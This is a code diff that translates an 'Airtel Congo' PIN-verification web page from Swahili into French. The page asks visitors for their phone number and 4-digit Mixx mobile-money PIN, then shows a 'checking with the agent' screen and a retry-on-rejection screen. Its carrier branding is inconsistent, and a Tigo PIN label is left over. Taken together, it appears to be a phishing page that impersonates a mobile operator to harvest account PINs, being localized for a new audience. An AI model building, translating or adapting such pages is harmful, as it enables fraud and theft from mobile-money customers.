@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uthibitishaji wa PIN - Airtel Congo</title>
+    <title>Vérification PIN - Airtel Congo</title>
     <link rel="stylesheet" href="style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -16,7 +16,7 @@
             <div class="logo-small">💰 Airtel Congo</div>
             <div class="security-indicator">
                 <span class="lock-icon">🔒</span>
-                <span>Uthibitishaji wa PIN</span>
+                <span>Vérification PIN</span>
             </div>
         </div>
 
@@ -25,46 +25,46 @@
             <div class="progress-steps">
                 <div class="step-item completed">
                     <div class="step-circle">✓</div>
-                    <span>Maelezo Binafsi</span>
+                    <span>Informations Personnelles</span>
                 </div>
                 <div class="step-line active"></div>
                 <div class="step-item active">
                     <div class="step-circle">2</div>
-                    <span>Uthibitishaji</span>
+                    <span>Vérification</span>
                 </div>
                 <div class="step-line"></div>
                 <div class="step-item">
                     <div class="step-circle">3</div>
-                    <span>Idhini</span>
+                    <span>Approbation</span>
                 </div>
             </div>
         </div>
 
         <!-- PIN Entry Screen -->
         <div id="pinScreen" class="form-card">
-            <h1 class="form-title">Thibitisha Utambulisho Wako</h1>
-            <p class="form-subtitle">Tunahitaji kuthibitisha simu yako na PIN yako ya Mixx</p>
+            <h1 class="form-title">Vérifiez Votre Identité</h1>
+            <p class="form-subtitle">Nous devons vérifier votre téléphone et votre PIN Mixx</p>
 
             <div class="form-group">
-                <label>Nambari ya Simu *</label>
+                <label>Numéro de Téléphone *</label>
                 <input type="tel" id="phoneNumber" required placeholder="+243712345678" class="large-input">
-                <small class="help-text">Weka nambari yako ya simu ya Mixx</small>
+                <small class="help-text">Entrez votre numéro de téléphone Mixx</small>
             </div>
 
             <div class="form-group">
-                <label>PIN ya Tigo (Nambari 4) *</label>
+                <label>PIN Mixx (4 Chiffres) *</label>
                 <input type="password" id="pin" required maxlength="4" placeholder="****" class="large-input pin-input" inputmode="numeric">
-                <small class="help-text">Weka PIN yako ya Mixx yenye nambari 4</small>
+                <small class="help-text">Entrez votre PIN Mixx à 4 chiffres</small>
             </div>
 
             <button id="verifyPinBtn" class="submit-button">
-                Thibitisha na Endelea
+                Vérifier et Continuer
                 <span class="arrow">→</span>
             </button>
 
             <div class="info-box">
-                <p><strong>Kwa nini tunahitaji hii?</strong></p>
-                <p>Tunahakikisha kuwa wewe ndiye mmiliki wa akaunti na kuzuia matumizi yasiyo ya halali ya taarifa zako.</p>
+                <p><strong>Pourquoi avons-nous besoin de cela ?</strong></p>
+                <p>Nous vérifions que vous êtes bien le titulaire du compte afin de prévenir toute utilisation non autorisée de vos informations.</p>
             </div>
         </div>
 
@@ -72,12 +72,12 @@
         <div id="processingScreen" class="form-card" style="display: none;">
             <div class="processing-content">
                 <div class="spinner-large"></div>
-                <h2 class="processing-title">Tunathibitisha Taarifa Zako</h2>
-                <p class="processing-text">Tafadhali subiri wakati tunathibitisha nambari yako ya simu na PIN...</p>
+                <h2 class="processing-title">Nous Vérifions Vos Informations</h2>
+                <p class="processing-text">Veuillez patienter pendant que nous vérifions votre numéro de téléphone et votre PIN...</p>
                 
                 <div class="status-box">
                     <span class="status-dot"></span>
-                    <span>Tunakagua na msimamizi...</span>
+                    <span>Vérification auprès de l'agent...</span>
                 </div>
             </div>
         </div>
@@ -86,10 +86,10 @@
         <div id="rejectionScreen" class="form-card" style="display: none;">
             <div class="result-content">
                 <div class="result-icon error">✕</div>
-                <h2 class="result-title">Taarifa Batili</h2>
-                <p class="result-text">Samahani, taarifa ulizotoa hazijakubaliwa. Tafadhali jaribu tena au wasiliana na msaada.</p>
+                <h2 class="result-title">Informations Incorrectes</h2>
+                <p class="result-text">Désolé, les informations que vous avez fournies ne sont pas acceptées. Veuillez réessayer ou contacter le support.</p>
                 <button class="submit-button" onclick="location.reload()">
-                    Jaribu Tena
+                    Réessayer
                 </button>
             </div>
         </div>
